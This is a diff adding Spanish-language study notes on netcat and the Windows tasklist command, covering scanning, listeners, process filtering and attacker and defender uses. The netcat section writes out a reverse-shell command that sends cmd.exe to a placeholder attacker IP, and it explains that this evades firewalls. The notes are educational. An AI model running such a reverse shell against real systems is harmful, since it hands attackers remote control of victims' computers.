@@ -107,3 +107,114 @@ Si el atacante está fuera del Wi-Fi:
 
 ______________________________________________________________________________________
 
+______________________________________________________________________________________
+NETCAT (nc):
+
+¿QUE ES?
+Una herramienta de red ultra versátil que permite leer y escribir datos a través de conexiones de red utilizando los protocolos TCP o UDP.
+Se le conoce como la "Navaja Suiza" de las redes.
+
+¿COMO FUNCIONA?
+Funciona en dos modos principales:
+1. Modo Cliente: Se conecta a un puerto abierto en una computadora remota.
+2. Modo Escucha (Listener): Abre un puerto en tu propia computadora y se queda esperando a que alguien se conecte a ti.
+
+¿COMO SE USA?
+
+Comandos prácticos y banderas (Flags) esenciales:
+
+nc -zv 192.168.1.5 20-25
+-z : Modo escaneo (no envía datos, solo verifica si el puerto está abierto).
+-v : Modo detallado (verbose). Muestra qué está pasando.
+(Ejemplo: Escanea si los puertos del 20 al 25 están abiertos en esa IP).
+
+nc -l -p 4444
+-l : Modo escucha (Listener). Convierte tu PC en un servidor temporal.
+-p : Especifica el puerto local que vas a abrir (ej: 4444).
+(Uso: Todo lo que alguien escriba desde fuera hacia tu IP en el puerto 4444 aparecerá en tu pantalla).
+
+nc 192.168.1.5 4444
+(Uso: Se conecta como cliente a la IP y puerto especificados. Permite chatear o transferir archivos entre ambas PCs).
+
+CASOS DE USO:
+
+1. Para el Atacante (Explotación y Control)
+
+* Crear una Reverse Shell (Shell Inversa): Es el uso más famoso. 
+El atacante deja Netcat escuchando en su PC y hace que la víctima ejecute un comando que le "regala" la terminal de comandos (CMD o Bash) a través de la red, 
+tomando control total del sistema.
+* Transferencia de herramientas: Permite enviar scripts de ataque directamente a la máquina víctima si no hay internet o navegadores disponibles.
+
+2. Para el Defensor (Diagnóstico y Monitoreo)
+
+* Probar Firewalls: Verifica si un puerto específico está bloqueado o abierto entre dos servidores de la empresa.
+* Servidor de respaldo rápido: Permite levantar un servicio temporal para recibir registros (logs) o archivos de diagnóstico de forma inmediata.
+
+CONCEPTO CLAVE: REVERSE SHELL (Shell Inversa)
+
+¿QUE ES?
+Técnica de explotación donde la computadora de la víctima inicia la conexión hacia la computadora del atacante, 
+entregándole el control total de su terminal de comandos (CMD o Bash).
+
+¿POR QUE SE USA? (Evasión de Firewalls)
+Los firewalls bloquean estrictamente las conexiones entrantes (de afuera hacia adentro), 
+pero permiten las conexiones salientes (de adentro hacia afuera, como navegar por internet). 
+Al hacer que la víctima "llame" al hacker, el ataque burla las defensas de la red de forma silenciosa.
+
+¿COMO FUNCIONA CON NETCAT?
+1. Atacante (Se pone a la escucha en su IP pública):
+   nc -l -p 4444
+
+2. Víctima (Ejecuta un script malicioso que envía su consola al atacante):
+   nc [IP_DEL_ATACANTE] 4444 -e cmd.exe
+
+Resultado: El atacante obtiene acceso remoto total al sistema de la víctima con el nivel de privilegios que tenga el usuario que ejecutó el comando.
+<-------
+
+
+Al igual que Nmap, Netcat no viene instalado por defecto en Windows CMD, pero es obligatorio tenerlo en cualquier entorno de auditoría. <-------
+______________________________________________________________________________________
+ _____________________________________________________________________________________
+TASKLIST (Task List):
+
+¿QUE ES?
+Comando nativo de Windows (CMD) que muestra una lista detallada de todos los procesos (programas y servicios) 
+que se están ejecutando en la memoria de la computadora en ese momento.
+
+¿COMO FUNCIONA?
+Consulta al administrador de tareas interno del sistema y genera un reporte en texto plano 
+que vincula el "Nombre de la imagen" (el archivo .exe) con su respectivo "PID" (ID del Proceso) y el uso de memoria.
+
+¿COMO SE USA?
+
+tasklist /FI "PID eq 4372"
+
+Resultado básico de ejemplo:
+Nombre de imagen               PID Nombre de sesión    Núm. de se  Uso de mem
+========================= ======== ================ =========== ============
+thorium.exe                   4372 Console                    1    184.240 KB
+
+Banderas (Flags) esenciales más utilizadas:
+/FI : Aplica un filtro para no tener que buscar entre cientos de líneas. 
+      * "PID eq [número]" -> Filtra por un ID de proceso exacto.
+      * "IMAGENAME eq [nombre.exe]" -> Busca todas las instancias de un programa.
+/SVC: Muestra qué servicios ocultos de Windows están corriendo dentro de cada proceso (útil para detectar malware camuflado como procesos del sistema).
+
+CASOS DE USO:
+
+1. Para el Defensor (Análisis y Respuesta a Incidentes)
+
+* Desenmascarar conexiones: Es el paso final tras usar `netstat -ano`. 
+Si encuentras una conexión sospechosa, pasas su PID a `tasklist /FI` para saber qué archivo `.exe` la está provocaión.
+* Detectar procesos falsos: Permite revisar si hay programas corriendo desde rutas extrañas o con nombres falsos que intentan imitar a herramientas del sistema (ej. `svch0st.exe`).
+
+2. Para el Atacante (Post-Explotación)
+
+* Reconocimiento local: Una vez dentro del sistema, el hacker ejecuta `tasklist` para saber qué software de seguridad
+(Antivirus, EDR, Windows Defender) tiene instalado la víctima e intentar desactivarlo o evadirlo.
+
+Si identificas un proceso malicioso y necesitas cerrarlo a la fuerza desde la consola, el comando complementario es `taskkill /PID [número] /F`. <-------
+______________________________________________________________________________________
+
+
+
